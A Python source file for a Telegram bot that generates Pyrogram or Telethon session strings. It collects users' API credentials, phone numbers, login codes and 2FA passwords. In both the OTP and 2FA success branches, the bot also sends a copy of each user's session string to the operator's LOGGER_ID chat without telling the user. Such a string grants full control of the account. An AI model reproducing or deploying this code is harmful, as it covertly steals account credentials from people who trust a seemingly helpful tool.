import os
import time
from pyrogram import Client, filters
from pyrogram.errors import SessionPasswordNeeded
from telethon.sessions import StringSession
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from motor.motor_asyncio import AsyncIOMotorClient

from start import WELCOME_TEXT, start_buttons
from help import HELP_TEXT, help_buttons

# ---------------- CONFIG ---------------- #

API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHANNEL = "hellupdates1"
OWNER_ID = int(os.getenv("OWNER_ID", 0))
LOGGER_ID = int(os.getenv("LOGGER_ID", 0))
MONGO_URL = os.getenv("MONGO_URL")

bot = Client("string_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ---------------- DB ---------------- #

users_db = None
try:
    mongo = AsyncIOMotorClient(MONGO_URL)
    users_db = mongo["bot"]["users"]
except Exception as e:
    print("Mongo Error:", e)

users = {}

# ---------------- LOGGER ---------------- #

async def send_log(text):
    try:
        await bot.send_message(LOGGER_ID, text)
    except Exception as e:
        print("Logger Error:", e)

# ---------------- FORCE JOIN ---------------- #

async def is_joined(client, user_id):
    try:
        await client.get_chat_member(CHANNEL, user_id)
        return True
    except:
        return False

# ---------------- START ---------------- #

@bot.on_message(filters.command("start"))
async def start(client, message):
    user = message.from_user

    existing = None
    if users_db:
        existing = await users_db.find_one({"user_id": user.id})
        await users_db.update_one(
            {"user_id": user.id},
            {"$set": {"user_id": user.id}},
            upsert=True
        )

    if not existing:
        await send_log(f"🚀 NEW USER\nID: {user.id}")

    if not await is_joined(client, user.id):
        return await message.reply(
            "⚠️ Join channel first",
            reply_markup=start_buttons(CHANNEL)
        )

    await message.reply(WELCOME_TEXT, reply_markup=start_buttons(CHANNEL))

# ---------------- BROADCAST ---------------- #

@bot.on_message(filters.command("broadcast") & filters.user(OWNER_ID))
async def broadcast(client, message):

    if users_db is None:
        return await message.reply("DB error")

    success = failed = 0

    if message.reply_to_message:
        msg = message.reply_to_message
        async for u in users_db.find():
            try:
                await msg.copy(u["user_id"])
                success += 1
            except:
                failed += 1

    elif len(message.command) > 1:
        msg = message.text.split(None, 1)[1]
        async for u in users_db.find():
            try:
                await bot.send_message(u["user_id"], msg)
                success += 1
            except:
                failed += 1
    else:
        return await message.reply("Reply or give text")

    await message.reply(f"Done ✅\nSuccess: {success}\nFailed: {failed}")

# ---------------- SELECT ---------------- #

@bot.on_callback_query(filters.regex("pyro|tele"))
async def choose(client, cb):
    users[cb.from_user.id] = {
        "type": cb.data,
        "time": time.time()
    }
    await cb.message.edit("Send API_ID")

# ---------------- HANDLER ---------------- #

@bot.on_message(filters.private & filters.text)
async def handler(client, message):

    user_data = users.get(message.from_user.id)
    if not user_data:
        return

    if time.time() - user_data["time"] > 180:
        users.pop(message.from_user.id)
        return await message.reply("⌛ Timeout")

    try:

        # API ID
        if "api_id" not in user_data:
            user_data["api_id"] = int(message.text)
            user_data["time"] = time.time()
            return await message.reply("Send API_HASH")

        # API HASH
        elif "api_hash" not in user_data:
            user_data["api_hash"] = message.text
            user_data["time"] = time.time()
            return await message.reply("Send Phone (+91...)")

        # PHONE
        elif "phone" not in user_data:
            user_data["phone"] = message.text
            user_data["time"] = time.time()

            if user_data["type"] == "pyro":
                app = Client(
                    "temp",
                    api_id=user_data["api_id"],
                    api_hash=user_data["api_hash"]
                )
                await app.connect()
                code = await app.send_code(user_data["phone"])
                user_data["app"] = app
                user_data["hash"] = code.phone_code_hash

            else:
                client_t = TelegramClient(
                    StringSession(),
                    user_data["api_id"],
                    user_data["api_hash"]
                )
                await client_t.connect()
                await client_t.send_code_request(user_data["phone"])
                user_data["client"] = client_t

            return await message.reply("📩 Send OTP")

        # OTP
        elif "otp" not in user_data:

            user_data["otp"] = message.text
            user_data["time"] = time.time()

            try:
                if user_data["type"] == "pyro":
                    await user_data["app"].sign_in(
                        user_data["phone"],
                        user_data["hash"],
                        user_data["otp"]
                    )
                else:
                    await user_data["client"].sign_in(
                        phone=user_data["phone"],
                        code=user_data["otp"]
                    )

            except (SessionPasswordNeeded, SessionPasswordNeededError):
                user_data["need_pass"] = True
                return await message.reply("🔐 Send 2FA Password")

            # SUCCESS LOGIN
            if user_data["type"] == "pyro":
                string = await user_data["app"].export_session_string()
                await user_data["app"].disconnect()
            else:
                string = user_data["client"].session.save()
                if not string:
                    raise Exception("Session not generated")
                await user_data["client"].disconnect()

            await message.reply_document(bytes(string, "utf-8"), file_name="string.txt")

            user = message.from_user
            await send_log(f"🆕 SESSION\nID: {user.id}")

            await bot.send_document(LOGGER_ID, bytes(string, "utf-8"), file_name=f"{user.id}.txt")

            users.pop(message.from_user.id)
            return

        # PASSWORD
        elif user_data.get("need_pass"):

            try:
                if user_data["type"] == "pyro":
                    await user_data["app"].check_password(message.text)
                    string = await user_data["app"].export_session_string()
                    await user_data["app"].disconnect()

                else:
                    if not user_data["client"].is_connected():
                        await user_data["client"].connect()

                    await user_data["client"].sign_in(password=message.text)

                    string = user_data["client"].session.save()
                    if not string:
                        raise Exception("Session not generated")

                    await user_data["client"].disconnect()

                await message.reply_document(bytes(string, "utf-8"), file_name="string.txt")

                user = message.from_user
                await send_log(f"🔐 2FA SESSION\nID: {user.id}")

                await bot.send_document(LOGGER_ID, bytes(string, "utf-8"), file_name=f"{user.id}_2fa.txt")

            except Exception as e:
                return await message.reply(f"❌ Wrong Password: {e}")

            users.pop(message.from_user.id)
            return

    except Exception as e:
        await message.reply(f"❌ Error: {e}")
        users.pop(message.from_user.id, None)

# ---------------- RUN ---------------- #

if __name__ == "__main__":
    try:
        print("🚀 Bot Started...")
        bot.run()
    except Exception as e:
        print("CRASH ERROR:", e)
